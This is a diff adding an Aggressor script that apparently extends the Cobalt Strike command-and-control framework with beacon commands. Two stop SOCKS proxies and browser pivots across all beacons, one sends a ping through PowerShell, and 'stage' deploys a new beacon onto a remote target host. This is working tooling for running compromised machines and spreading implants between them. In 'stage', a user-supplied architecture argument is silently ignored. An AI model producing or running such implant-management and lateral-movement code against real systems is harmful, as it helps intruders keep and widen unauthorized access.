@@ -1,0 +1,42 @@
+beacon_command_register("masssocksstop", "[*] used to stop socks proxy for all beacons",
+	"Synopsis: masssocksstop\n\n" .
+	"Used to stop the socks proxy for all beacons.\n\n");
+alias masssocksstop {
+    $command = $2;
+    foreach $beacon (beacons()) {
+        $id = $beacon['id'];
+        bsocks_stop($id);
+        #btask($id, $command);
+    }
+}
+
+beacon_command_register("massbpstop", "[*] used to stop browser pivot for all beacons",
+	"Synopsis: massbpstop\n\n" .
+	"Used to stop the browser pivot proxy for all beacons.\n\n");
+alias massbpstop {
+    $command = $2;
+    foreach $beacon (beacons()) {
+        $id = $beacon['id'];
+        bbrowserpivot_stop($id);
+        #btask($id, $command);
+    }
+}
+
+beacon_command_register("pping", "[*] send one ping packet with powershell",
+	"Synopsis: pping [target]\n\n" .
+	"Send one ping packet with the PowerShell (powerpick) command: Test-Connection -Count 1 -Computer [target]");
+alias pping {
+	binput($1,"powerpick Test-Connection -Count 1 -Computer $2");
+	bpowerpick($1,"Test-Connection -Count 1 -Computer $2");
+}
+
+beacon_command_register("stage", "[*] used to stage a beacon",
+	"Synopsis: stage [target] [listener] [x86|x64] (x86 by default)\n\n" .
+	"Used to stage a beacon. Using make_token beforehand may be required.\n\n" .
+	"[target] is an IP address or hostname");
+alias stage {
+    # defaults to x86
+    local('$arch');
+    if ($4 is $null) { $arch = "x86"; }
+	bstage($1, $2, $3, $arch);
+}
